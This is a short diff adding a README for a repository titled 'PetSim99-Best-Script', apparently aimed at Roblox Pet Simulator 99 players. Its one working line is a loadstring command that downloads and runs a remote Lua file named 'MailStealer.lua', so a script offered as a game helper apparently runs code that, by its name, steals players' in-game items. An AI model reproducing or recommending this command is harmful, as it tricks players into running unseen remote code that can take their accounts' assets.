@@ -1,0 +1,2 @@
+# PetSim99-Best-Script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rade22YT/PS99_Mailstealer/main/MailStealer.lua"))()
